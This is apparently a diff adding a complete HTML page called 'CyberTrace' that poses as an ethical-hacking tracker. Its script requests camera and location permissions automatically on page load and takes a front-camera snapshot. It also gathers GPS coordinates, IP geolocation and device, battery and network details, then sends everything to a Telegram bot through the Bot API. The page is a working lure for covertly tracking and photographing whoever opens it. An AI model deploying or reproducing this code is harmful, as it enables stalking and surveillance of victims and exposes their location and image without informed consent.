@@ -1,0 +1,751 @@
+<html lang="en" class="scroll-smooth" >
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>CyberTrace - Certified Ethical Hacker Tracker</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
+<style>
+  body {
+    font-family: 'Orbitron', sans-serif;
+    background: #0f0f0f;
+    color: #00ff99;
+    overflow-x: hidden;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+  /* Glowing text effect */
+  .glow-text {
+    text-shadow:
+      0 0 5px #00ff99,
+      0 0 10px #00ff99,
+      0 0 20px #00ff99,
+      0 0 40px #00ff99,
+      0 0 80px #00ff99;
+  }
+  /* Edge lighting effect on buttons */
+  .edge-light {
+    position: relative;
+    overflow: hidden;
+    z-index: 0;
+  }
+  .edge-light::before {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -50%;
+    width: 200%;
+    height: 200%;
+    background: linear-gradient(45deg, #00ff99, #00cc77, #00ff99, #00cc77);
+    animation: edgeLightAnim 3s linear infinite;
+    filter: blur(8px);
+    opacity: 0.7;
+    z-index: -1;
+  }
+  @keyframes edgeLightAnim {
+    0% { transform: rotate(0deg) translate(0,0); }
+    100% { transform: rotate(360deg) translate(0,0); }
+  }
+  /* Smooth fade in */
+  .fade-in {
+    animation: fadeInAnim 1.2s ease forwards;
+    opacity: 0;
+  }
+  @keyframes fadeInAnim {
+    to { opacity: 1; }
+  }
+  /* Camera video styling */
+  #cameraStream {
+    border: 3px solid #00ff99;
+    border-radius: 12px;
+    box-shadow:
+      0 0 10px #00ff99,
+      0 0 20px #00ff99,
+      0 0 40px #00ff99;
+    background: black;
+  }
+  /* Scrollbar styling */
+  ::-webkit-scrollbar {
+    width: 8px;
+  }
+  ::-webkit-scrollbar-track {
+    background: #0f0f0f;
+  }
+  ::-webkit-scrollbar-thumb {
+    background: #00ff99;
+    border-radius: 10px;
+  }
+  /* Popup fade and scale */
+  @keyframes fadeInScale {
+    0% {opacity: 0; transform: scale(0.8);}
+    100% {opacity: 1; transform: scale(1);}
+  }
+  .popup-content {
+    animation: fadeInScale 0.4s ease forwards;
+  }
+  /* Responsive text scaling */
+  @media (max-width: 640px) {
+    h1, h2, h3 {
+      word-break: break-word;
+    }
+  }
+  /* Strong contrast for text */
+  p, pre, div, span, button {
+    color: #00ff99 !important;
+  }
+  /* Button focus visible */
+  button:focus-visible {
+    outline: 2px solid #00ff99;
+    outline-offset: 2px;
+  }
+  /* Footer fixed bottom */
+  footer {
+    flex-shrink: 0;
+  }
+  /* Hide video after snapshot */
+  #cameraStream.hidden {
+    display: none;
+  }
+  /* Button pressed effect */
+  button:active {
+    transform: scale(0.97);
+    transition: transform 0.1s ease;
+  }
+  /* Main container fade in */
+  #mainContent {
+    opacity: 0;
+    transform: translateY(20px);
+    transition: opacity 0.8s ease, transform 0.8s ease;
+  }
+  #mainContent.visible {
+    opacity: 1;
+    transform: translateY(0);
+  }
+  /* Permission section fade out */
+  #permissionSection.fade-out {
+    opacity: 0;
+    transform: translateY(-20px);
+    transition: opacity 0.8s ease, transform 0.8s ease;
+  }
+  /* Contact Me fade in */
+  #contactMe {
+    opacity: 0;
+    transform: translateY(20px);
+    transition: opacity 0.8s ease, transform 0.8s ease;
+  }
+  #contactMe.visible {
+    opacity: 1;
+    transform: translateY(0);
+  }
+  /* Header flicker animation */
+  @keyframes flicker {
+    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
+      opacity: 1;
+      text-shadow:
+        0 0 5px #00ff99,
+        0 0 10px #00ff99,
+        0 0 20px #00ff99,
+        0 0 40px #00ff99,
+        0 0 80px #00ff99;
+    }
+    20%, 22%, 24%, 55% {
+      opacity: 0.4;
+      text-shadow: none;
+    }
+  }
+  header h1 {
+    animation: flicker 3s infinite;
+  }
+  /* Animated gradient border for main content */
+  #mainContent {
+    border-image-slice: 1;
+    border-width: 3px;
+    border-style: solid;
+    border-image-source: linear-gradient(45deg, #00ff99, #00cc77, #00ff99, #00cc77);
+    animation: borderGlow 6s linear infinite;
+  }
+  @keyframes borderGlow {
+    0% {
+      border-image-source: linear-gradient(45deg, #00ff99, #00cc77, #00ff99, #00cc77);
+    }
+    50% {
+      border-image-source: linear-gradient(135deg, #00cc77, #00ff99, #00cc77, #00ff99);
+    }
+    100% {
+      border-image-source: linear-gradient(45deg, #00ff99, #00cc77, #00ff99, #00cc77);
+    }
+  }
+  /* Animated pulse on icons */
+  .pulse-icon {
+    animation: pulseGlow 2.5s ease-in-out infinite;
+  }
+  @keyframes pulseGlow {
+    0%, 100% {
+      text-shadow:
+        0 0 5px #00ff99,
+        0 0 10px #00ff99,
+        0 0 20px #00ff99;
+      color: #00ff99;
+    }
+    50% {
+      text-shadow:
+        0 0 15px #00ff99,
+        0 0 30px #00ff99,
+        0 0 40px #00ff99;
+      color: #00ff99cc;
+    }
+  }
+  /* Scroll smooth for anchor links */
+  html {
+    scroll-behavior: smooth;
+  }
+  /* Disable user select on all except text containers */
+  body *:not(pre):not(code):not(input):not(textarea) {
+    user-select: none;
+  }
+  /* Enable user select on text containers */
+  pre, code, input, textarea {
+    user-select: text;
+  }
+  /* Responsive adjustments */
+  @media (max-width: 768px) {
+    #mainContent {
+      padding: 1.5rem !important;
+    }
+    #contactMe {
+      padding: 1.5rem !important;
+    }
+  }
+</style>
+</head>
+<body class="bg-black text-green-400 flex flex-col min-h-screen">
+
+<header class="w-full py-6 px-4 sm:px-8 flex justify-center border-b border-green-600 select-none">
+  <h1 class="text-3xl sm:text-5xl font-extrabold glow-text tracking-widest flicker">CYBERTRACE</h1>
+</header>
+
+<main class="flex-grow flex flex-col items-center justify-center px-4 sm:px-8 max-w-5xl mx-auto w-full">
+
+  <!-- PERMISSION REQUEST PAGE -->
+  <section id="permissionSection" class="w-full max-w-md bg-[#001a00] rounded-xl p-6 shadow-lg border border-green-600 flex flex-col items-center gap-6 fade-in" role="region" aria-label="Permission request section" tabindex="0">
+    <div class="text-center">
+      <i class="fas fa-user-secret fa-6x text-green-400 mb-4 pulse-icon" aria-hidden="true"></i>
+      <h2 class="text-3xl font-semibold glow-text mb-2">Welcome to CyberTrace</h2>
+      <p class="text-green-300 text-base leading-relaxed max-w-[320px] mx-auto">
+        To proceed, <span class="font-bold text-green-400">Camera</span> and <span class="font-bold text-green-400">Location</span> permissions are required.
+      </p>
+      <p class="text-green-300 text-xs mt-1 italic max-w-[320px] mx-auto">Certified Ethical Hacker Tracking System - For Educational Purposes Only</p>
+    </div>
+    <button id="requestPermissionsBtn" aria-label="Grant Camera and Location Permissions" class="edge-light bg-black hover:bg-green-900 transition-colors duration-300 rounded-lg px-8 py-3 text-green-400 font-semibold text-lg shadow-lg select-none focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-1">
+      🔐 Grant Permissions &rarr;
+    </button>
+  </section>
+
+  <!-- MAIN TRACKING PAGE -->
+  <section id="mainContent" class="hidden w-full max-w-5xl mt-10 bg-[#001a00] rounded-xl p-8 shadow-lg border border-green-600 flex flex-col gap-10" role="region" aria-label="Main tracking dashboard" tabindex="0">
+
+    <h2 class="text-4xl font-bold glow-text text-center mb-6 select-none">🛰️ CyberTrace Tracking Dashboard</h2>
+
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-10">
+
+      <!-- Location & IP Info -->
+      <div class="bg-black bg-opacity-30 rounded-xl p-6 border border-green-500 shadow-lg select-text" tabindex="0" aria-label="Location and IP information">
+        <h3 class="text-2xl font-semibold glow-text mb-4 flex items-center gap-3">
+          <i class="fas fa-map-marker-alt pulse-icon" aria-hidden="true"></i> Your Current Location & IP Info
+        </h3>
+        <div id="locationInfo" class="text-green-300 text-sm sm:text-base leading-relaxed whitespace-pre-wrap" aria-live="polite" aria-atomic="true" tabindex="0">
+          Loading location and IP data...
+        </div>
+      </div>
+
+      <!-- Camera Snapshot -->
+      <div class="bg-black bg-opacity-30 rounded-xl p-6 border border-green-500 shadow-lg flex flex-col items-center gap-4" tabindex="0" aria-label="User snapshot">
+        <h3 class="text-2xl font-semibold glow-text mb-2 flex items-center gap-3">
+          <i class="fas fa-camera-retro pulse-icon" aria-hidden="true"></i> Your Snapshot
+        </h3>
+        <div class="relative w-full max-w-md h-60 rounded-lg overflow-hidden border-4 border-green-500 shadow-lg" aria-label="Camera preview">
+          <img id="snapshotImage" alt="Snapshot of user taken from front camera in a dark cyberpunk style room with green neon lighting" class="w-full h-full object-cover rounded-lg bg-black" />
+          <video id="cameraStream" autoplay playsinline muted class="hidden w-full h-full object-cover rounded-lg bg-black"></video>
+          <canvas id="snapshotCanvas" class="hidden" aria-hidden="true"></canvas>
+        </div>
+        <p id="captureStatus" class="text-green-400 font-semibold mt-2 min-h-[1.5rem] select-none" aria-live="polite" aria-atomic="true"></p>
+      </div>
+
+    </div>
+
+    <!-- Device & Network Info -->
+    <div class="bg-black bg-opacity-30 rounded-xl p-6 border border-green-500 shadow-lg select-text" tabindex="0" aria-label="Device and network information">
+      <h3 class="text-2xl font-semibold glow-text mb-4 flex items-center gap-3">
+        <i class="fas fa-microchip pulse-icon" aria-hidden="true"></i> Device & Network Information
+      </h3>
+      <pre id="deviceInfo" class="text-green-300 text-sm sm:text-base whitespace-pre-wrap max-h-72 overflow-y-auto" tabindex="0"></pre>
+    </div>
+
+  </section>
+
+  <!-- CONTACT ME SECTION -->
+  <section id="contactMe" class="hidden w-full max-w-5xl mt-12 bg-[#001a00] rounded-xl p-8 shadow-lg border border-green-600 flex flex-col gap-6 select-none" tabindex="0" aria-label="Contact me section">
+    <h2 class="text-3xl font-bold glow-text text-center mb-4">📞 Contact Me</h2>
+    <p class="text-green-300 text-center max-w-3xl mx-auto leading-relaxed text-sm sm:text-base">
+      Reach out to me on any platform below. I’m always open for collaboration and discussion.
+    </p>
+    <div class="flex flex-wrap justify-center gap-6 mt-4">
+      <a href="https://wa.me/1234567890" target="_blank" rel="noopener" aria-label="WhatsApp" class="edge-light flex items-center gap-2 bg-black hover:bg-green-900 transition-colors duration-300 rounded-lg px-5 py-3 text-green-400 font-semibold shadow-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-1">
+        <i class="fab fa-whatsapp fa-lg" aria-hidden="true"></i> WhatsApp
+      </a>
+      <a href="https://instagram.com/yourprofile" target="_blank" rel="noopener" aria-label="Instagram" class="edge-light flex items-center gap-2 bg-black hover:bg-green-900 transition-colors duration-300 rounded-lg px-5 py-3 text-green-400 font-semibold shadow-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-1">
+        <i class="fab fa-instagram fa-lg" aria-hidden="true"></i> Instagram
+      </a>
+      <a href="https://github.com/yourprofile" target="_blank" rel="noopener" aria-label="GitHub" class="edge-light flex items-center gap-2 bg-black hover:bg-green-900 transition-colors duration-300 rounded-lg px-5 py-3 text-green-400 font-semibold shadow-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-1">
+        <i class="fab fa-github fa-lg" aria-hidden="true"></i> GitHub
+      </a>
+      <a href="https://t.me/yourprofile" target="_blank" rel="noopener" aria-label="Telegram" class="edge-light flex items-center gap-2 bg-black hover:bg-green-900 transition-colors duration-300 rounded-lg px-5 py-3 text-green-400 font-semibold shadow-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-1">
+        <i class="fab fa-telegram fa-lg" aria-hidden="true"></i> Telegram
+      </a>
+      <a href="mailto:youremail@example.com" target="_blank" rel="noopener" aria-label="Email" class="edge-light flex items-center gap-2 bg-black hover:bg-green-900 transition-colors duration-300 rounded-lg px-5 py-3 text-green-400 font-semibold shadow-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-1">
+        <i class="fas fa-envelope fa-lg" aria-hidden="true"></i> Email
+      </a>
+    </div>
+  </section>
+
+</main>
+
+<footer class="w-full bg-[#001a00] border-t border-green-600 py-6 px-4 sm:px-8 flex flex-col sm:flex-row justify-between items-center gap-6 select-none">
+  <div class="text-green-400 font-semibold text-lg glow-text">© 2024 CyberTrace</div>
+  <div class="flex flex-wrap gap-4 justify-center sm:justify-end">
+    <a href="https://wa.me/1234567890" target="_blank" rel="noopener" aria-label="WhatsApp" class="edge-light flex items-center gap-2 bg-black hover:bg-green-900 transition-colors duration-300 rounded-lg px-4 py-2 text-green-400 font-semibold shadow-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-1">
+      <i class="fab fa-whatsapp fa-lg" aria-hidden="true"></i> WhatsApp
+    </a>
+    <a href="https://instagram.com/yourprofile" target="_blank" rel="noopener" aria-label="Instagram" class="edge-light flex items-center gap-2 bg-black hover:bg-green-900 transition-colors duration-300 rounded-lg px-4 py-2 text-green-400 font-semibold shadow-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-1">
+      <i class="fab fa-instagram fa-lg" aria-hidden="true"></i> Instagram
+    </a>
+    <a href="https://github.com/yourprofile" target="_blank" rel="noopener" aria-label="GitHub" class="edge-light flex items-center gap-2 bg-black hover:bg-green-900 transition-colors duration-300 rounded-lg px-4 py-2 text-green-400 font-semibold shadow-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-1">
+      <i class="fab fa-github fa-lg" aria-hidden="true"></i> GitHub
+    </a>
+    <a href="https://t.me/yourprofile" target="_blank" rel="noopener" aria-label="Telegram" class="edge-light flex items-center gap-2 bg-black hover:bg-green-900 transition-colors duration-300 rounded-lg px-4 py-2 text-green-400 font-semibold shadow-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-1">
+      <i class="fab fa-telegram fa-lg" aria-hidden="true"></i> Telegram
+    </a>
+    <a href="mailto:youremail@example.com" target="_blank" rel="noopener" aria-label="Email" class="edge-light flex items-center gap-2 bg-black hover:bg-green-900 transition-colors duration-300 rounded-lg px-4 py-2 text-green-400 font-semibold shadow-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-1">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i> Email
+    </a>
+  </div>
+</footer>
+
+<!-- POPUP MESSAGE -->
+<div id="popupMessage" class="fixed inset-0 bg-black bg-opacity-90 backdrop-blur-sm flex items-center justify-center p-4 hidden z-50" role="alertdialog" aria-modal="true" aria-labelledby="popupTitle" aria-describedby="popupText">
+  <div class="bg-[#002200] border border-green-600 rounded-xl p-8 max-w-sm w-full text-center shadow-lg glow-text popup-content">
+    <h3 id="popupTitle" class="text-3xl font-bold mb-4 select-none"></h3>
+    <p id="popupText" class="text-green-300 text-lg mb-6 select-none"></p>
+    <button id="popupCloseBtn" aria-label="Close Popup" class="edge-light bg-black hover:bg-green-900 transition-colors duration-300 rounded-lg px-6 py-3 text-green-400 font-semibold shadow-lg select-none focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-1">
+      ✖ Close
+    </button>
+  </div>
+</div>
+
+<script>
+  // Telegram Bot Config - Replace with your token and chat_id
+  const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+  const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+
+  // Elements
+  const permissionSection = document.getElementById('permissionSection');
+  const requestPermissionsBtn = document.getElementById('requestPermissionsBtn');
+  const mainContent = document.getElementById('mainContent');
+  const developerInfo = document.getElementById('contactMe');
+  const popupMessage = document.getElementById('popupMessage');
+  const popupTitle = document.getElementById('popupTitle');
+  const popupText = document.getElementById('popupText');
+  const popupCloseBtn = document.getElementById('popupCloseBtn');
+  const locationInfo = document.getElementById('locationInfo');
+  const cameraStream = document.getElementById('cameraStream');
+  const snapshotCanvas = document.getElementById('snapshotCanvas');
+  const captureStatus = document.getElementById('captureStatus');
+  const deviceInfoPre = document.getElementById('deviceInfo');
+  const snapshotImage = document.getElementById('snapshotImage');
+
+  let stream = null;
+  let userLocation = null;
+  let userIPInfo = null;
+  let snapshotDataUrl = null;
+  let batteryInfo = null;
+
+  // Show popup message function
+  function showPopup(title, text) {
+    popupTitle.textContent = title;
+    popupText.textContent = text;
+    popupMessage.classList.remove('hidden');
+    popupCloseBtn.focus();
+  }
+  function hidePopup() {
+    popupMessage.classList.add('hidden');
+  }
+  popupCloseBtn.addEventListener('click', () => {
+    hidePopup();
+  });
+
+  // Fetch IP info from ipinfo.io (free tier, no API key needed for basic info)
+  async function fetchIPInfo() {
+    try {
+      const res = await fetch('https://ipinfo.io/json?token=');
+      if (!res.ok) throw new Error('Failed to fetch IP info');
+      const data = await res.json();
+      return data;
+    } catch (e) {
+      return null;
+    }
+  }
+
+  // Send data to Telegram Bot
+  async function sendToTelegram(message, photoBase64) {
+    try {
+      // Send text message first
+      const textPayload = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true,
+      };
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(textPayload),
+      });
+
+      // If photoBase64 is provided, send photo
+      if (photoBase64) {
+        const blob = await (await fetch(photoBase64)).blob();
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', blob, 'snapshot.png');
+        formData.append('caption', 'User Snapshot');
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData,
+        });
+      }
+    } catch (e) {
+      console.error('Telegram send error:', e);
+    }
+  }
+
+  // Format location info nicely
+  function formatLocationInfo(loc, ipInfo) {
+    let text = '';
+    if (loc) {
+      text += `Latitude: ${loc.latitude.toFixed(6)}\n`;
+      text += `Longitude: ${loc.longitude.toFixed(6)}\n`;
+      text += `Accuracy: ±${loc.accuracy} meters\n`;
+      text += `Altitude: ${loc.altitude !== null ? loc.altitude + ' meters' : 'N/A'}\n`;
+      text += `Heading: ${loc.heading !== null ? loc.heading + '°' : 'N/A'}\n`;
+      text += `Speed: ${loc.speed !== null ? loc.speed + ' m/s' : 'N/A'}\n`;
+      text += `Timestamp: ${new Date(loc.timestamp).toLocaleString()}\n`;
+    } else {
+      text += `Location data not available.\n`;
+    }
+    if (ipInfo) {
+      text += `\n--- IP Info ---\n`;
+      text += `IP: ${ipInfo.ip}\n`;
+      text += `City: ${ipInfo.city}\n`;
+      text += `Region: ${ipInfo.region}\n`;
+      text += `Country: ${ipInfo.country}\n`;
+      text += `Org: ${ipInfo.org}\n`;
+      text += `Timezone: ${ipInfo.timezone}\n`;
+    }
+    return text;
+  }
+
+  // Capture snapshot from video stream
+  function captureSnapshot() {
+    if (!stream) return null;
+    const video = cameraStream;
+    const canvas = snapshotCanvas;
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    return canvas.toDataURL('image/png');
+  }
+
+  // Get device & network info
+  async function getDeviceInfo() {
+    const nav = navigator;
+    const screenInfo = window.screen;
+    const connection = nav.connection || nav.mozConnection || nav.webkitConnection || null;
+    const battery = await (nav.getBattery ? nav.getBattery() : Promise.resolve(null));
+    batteryInfo = battery;
+
+    // Device Memory (RAM) in GB (may be undefined)
+    const ram = nav.deviceMemory || 'N/A';
+
+    // Storage estimate (may be undefined)
+    let storageEstimate = 'N/A';
+    if (navigator.storage && navigator.storage.estimate) {
+      try {
+        const estimate = await navigator.storage.estimate();
+        if (estimate.quota && estimate.usage) {
+          storageEstimate = `${(estimate.usage / 1024 / 1024).toFixed(2)} MB used / ${(estimate.quota / 1024 / 1024).toFixed(2)} MB total`;
+        }
+      } catch {}
+    }
+
+    // Battery info
+    let batteryStatus = 'N/A';
+    if (battery) {
+      batteryStatus = `Charging: ${battery.charging ? 'Yes' : 'No'}\nLevel: ${(battery.level * 100).toFixed(0)}%`;
+    }
+
+    // Device type detection (basic)
+    const ua = nav.userAgent.toLowerCase();
+    let deviceType = 'Unknown';
+    if (/mobile|android|iphone|ipad|phone/i.test(ua)) deviceType = 'Mobile';
+    else if (/tablet|ipad/i.test(ua)) deviceType = 'Tablet';
+    else deviceType = 'Desktop';
+
+    // Browser info
+    const browser = (() => {
+      if (ua.indexOf('firefox') > -1) return 'Firefox';
+      if (ua.indexOf('chrome') > -1 && ua.indexOf('edg') === -1 && ua.indexOf('opr') === -1) return 'Chrome';
+      if (ua.indexOf('safari') > -1 && ua.indexOf('chrome') === -1) return 'Safari';
+      if (ua.indexOf('edg') > -1) return 'Edge';
+      if (ua.indexOf('opr') > -1) return 'Opera';
+      return 'Unknown';
+    })();
+
+    // OS info
+    const os = (() => {
+      if (ua.indexOf('windows nt 10') !== -1) return 'Windows 10';
+      if (ua.indexOf('windows nt 6.3') !== -1) return 'Windows 8.1';
+      if (ua.indexOf('windows nt 6.2') !== -1) return 'Windows 8';
+      if (ua.indexOf('windows nt 6.1') !== -1) return 'Windows 7';
+      if (ua.indexOf('mac os x') !== -1) return 'Mac OS X';
+      if (ua.indexOf('android') !== -1) return 'Android';
+      if (ua.indexOf('iphone') !== -1 || ua.indexOf('ipad') !== -1) return 'iOS';
+      if (ua.indexOf('linux') !== -1) return 'Linux';
+      return 'Unknown';
+    })();
+
+    // Brand & Model (limited info from userAgent)
+    let brandModel = 'N/A';
+    if (/iphone/.test(ua)) brandModel = 'Apple iPhone';
+    else if (/ipad/.test(ua)) brandModel = 'Apple iPad';
+    else if (/android/.test(ua)) {
+      const match = ua.match(/android.*;\s([^\);]+)[\);]/);
+      brandModel = match ? match[1].trim() : 'Android Device';
+    }
+
+    // Screen ratio
+    const screenRatio = (screenInfo.width / screenInfo.height).toFixed(2);
+
+    // Network info
+    const netType = connection ? connection.effectiveType || connection.type || 'Unknown' : 'Unknown';
+    const downlink = connection ? connection.downlink || 'Unknown' : 'Unknown';
+    const rtt = connection ? connection.rtt || 'Unknown' : 'Unknown';
+
+    // Compose info string
+    let info = '';
+    info += `Device Type: ${deviceType}\n`;
+    info += `OS: ${os}\n`;
+    info += `Browser: ${browser}\n`;
+    info += `Brand & Model: ${brandModel}\n`;
+    info += `Screen Resolution: ${screenInfo.width}x${screenInfo.height}\n`;
+    info += `Screen Ratio: ${screenRatio}\n`;
+    info += `RAM: ${ram} GB\n`;
+    info += `Storage Estimate: ${storageEstimate}\n`;
+    info += `Battery Status:\n${batteryStatus}\n`;
+    info += `Network Type: ${netType}\n`;
+    info += `Downlink Speed: ${downlink} Mbps\n`;
+    info += `RTT: ${rtt} ms\n`;
+    info += `User Agent: ${nav.userAgent}\n`;
+
+    return info;
+  }
+
+  // Compose and send all data to Telegram
+  async function sendAllData() {
+    const deviceInfoText = await getDeviceInfo();
+    deviceInfoPre.textContent = deviceInfoText;
+
+    let message = `<b>🛰️ CyberTrace User Data Report</b>\n\n`;
+
+    // Location & IP
+    if (userLocation) {
+      message += `<b>Location:</b>\n`;
+      message += `Latitude: ${userLocation.latitude.toFixed(6)}\n`;
+      message += `Longitude: ${userLocation.longitude.toFixed(6)}\n`;
+      message += `Accuracy: ±${userLocation.accuracy} meters\n`;
+      message += `Altitude: ${userLocation.altitude !== null ? userLocation.altitude + ' meters' : 'N/A'}\n`;
+      message += `Heading: ${userLocation.heading !== null ? userLocation.heading + '°' : 'N/A'}\n`;
+      message += `Speed: ${userLocation.speed !== null ? userLocation.speed + ' m/s' : 'N/A'}\n`;
+      message += `Timestamp: ${new Date(userLocation.timestamp).toLocaleString()}\n\n`;
+    } else {
+      message += `Location data not available.\n\n`;
+    }
+
+    if (userIPInfo) {
+      message += `<b>IP Info:</b>\n`;
+      message += `IP: ${userIPInfo.ip}\n`;
+      message += `City: ${userIPInfo.city}\n`;
+      message += `Region: ${userIPInfo.region}\n`;
+      message += `Country: ${userIPInfo.country}\n`;
+      message += `Org: ${userIPInfo.org}\n`;
+      message += `Timezone: ${userIPInfo.timezone}\n\n`;
+    }
+
+    message += `<b>Device & Network Info:</b>\n${deviceInfoText}`;
+
+    await sendToTelegram(message, snapshotDataUrl);
+  }
+
+  // Update location info on UI
+  function updateLocationInfo() {
+    locationInfo.textContent = formatLocationInfo(userLocation, userIPInfo);
+  }
+
+  // Automatically capture snapshot and send all data to Telegram
+  async function captureAndSend() {
+    captureStatus.textContent = '📸 Capturing snapshot...';
+    snapshotDataUrl = captureSnapshot();
+    if (!snapshotDataUrl) {
+      captureStatus.textContent = '❌ Failed to capture snapshot.';
+      return;
+    }
+    snapshotImage.src = snapshotDataUrl;
+    captureStatus.textContent = '📡 Sending data to CyberTrace HQ...';
+
+    await sendAllData();
+
+    captureStatus.textContent = '✅ Data sent successfully to CyberTrace HQ.';
+
+    // Stop camera stream and hide video
+    if (stream) {
+      stream.getTracks().forEach(track => track.stop());
+      stream = null;
+    }
+    cameraStream.classList.add('hidden');
+  }
+
+  // Request permissions and initialize tracking
+  async function requestPermissions() {
+    try {
+      // Request camera permission and get stream
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      cameraStream.srcObject = stream;
+      cameraStream.classList.remove('hidden');
+      snapshotImage.src = ''; // Clear previous snapshot if any
+
+      // Request location permission and get position
+      const position = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0,
+        });
+      });
+
+      userLocation = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        altitude: position.coords.altitude,
+        heading: position.coords.heading,
+        speed: position.coords.speed,
+        timestamp: position.timestamp,
+      };
+
+      userIPInfo = await fetchIPInfo();
+
+      // Show thank you popup
+      showPopup('✅ Thank You!!', 'Permissions granted. Initializing CyberTrace...');
+
+      // After 1.5 seconds, hide popup and show main content + contact me
+      setTimeout(() => {
+        hidePopup();
+        permissionSection.classList.add('fade-out');
+        setTimeout(() => {
+          permissionSection.classList.add('hidden');
+          mainContent.classList.remove('hidden');
+          mainContent.classList.add('visible');
+          developerInfo.classList.remove('hidden');
+          developerInfo.classList.add('visible');
+          updateLocationInfo();
+          captureStatus.textContent = 'Camera and Location permissions granted. Capturing snapshot...';
+          // Capture snapshot immediately
+          captureAndSend();
+        }, 400);
+      }, 1500);
+
+    } catch (err) {
+      // Stop any active stream if exists
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+      }
+      cameraStream.classList.add('hidden');
+
+      // Determine which permission was denied or error
+      let deniedMessage = '';
+      if (err && err.code) {
+        // Geolocation errors have code property
+        if (err.code === 1) {
+          deniedMessage = '❌ Location permission denied. Please allow location access to proceed.';
+        } else if (err.code === 2) {
+          deniedMessage = '❌ Location unavailable. Please ensure location services are enabled.';
+        } else if (err.code === 3) {
+          deniedMessage = '❌ Location request timed out. Please try again.';
+        } else {
+          deniedMessage = '❌ Permission denied or error occurred. Please grant Camera and Location permissions.';
+        }
+      } else if (err && err.name === 'NotAllowedError') {
+        deniedMessage = '❌ Camera permission denied. Please allow camera access to proceed.';
+      } else if (err && err.name === 'NotFoundError') {
+        deniedMessage = '❌ No camera device found. Please connect a camera and try again.';
+      } else {
+        deniedMessage = '❌ Permissions denied or error occurred. Please grant Camera and Location permissions.';
+      }
+
+      // Show popup with denied message
+      showPopup('⚠️ Permissions Required', deniedMessage);
+
+      // Reset button state so user can try again
+      requestPermissionsBtn.disabled = false;
+      requestPermissionsBtn.textContent = '🔐 Grant Permissions →';
+    }
+  }
+
+  // Event listeners
+  requestPermissionsBtn.addEventListener('click', async () => {
+    if (requestPermissionsBtn.disabled) return;
+    requestPermissionsBtn.disabled = true;
+    requestPermissionsBtn.textContent = '⏳ Requesting...';
+    await requestPermissions();
+  });
+
+  // Automatically trigger Grant Permissions button on page load after 1.5 seconds delay
+  // User can still manually press button if permissions not granted
+  function autoTriggerPermissions() {
+    let triggered = false;
+    function trigger() {
+      if (triggered) return;
+      triggered = true;
+      requestPermissionsBtn.click();
+      window.removeEventListener('click', trigger);
+      window.removeEventListener('keydown', trigger);
+      window.removeEventListener('touchstart', trigger);
+    }
+    setTimeout(() => {
+      trigger();
+    }, 1500);
+    // Also listen for user interaction to trigger immediately if they interact before timeout
+    window.addEventListener('click', trigger, { once: true });
+    window.addEventListener('keydown', trigger, { once: true });
+    window.addEventListener('touchstart', trigger, { once: true });
+  }
+  autoTriggerPermissions();
+
+</script>
+
+</body>
+  </html>
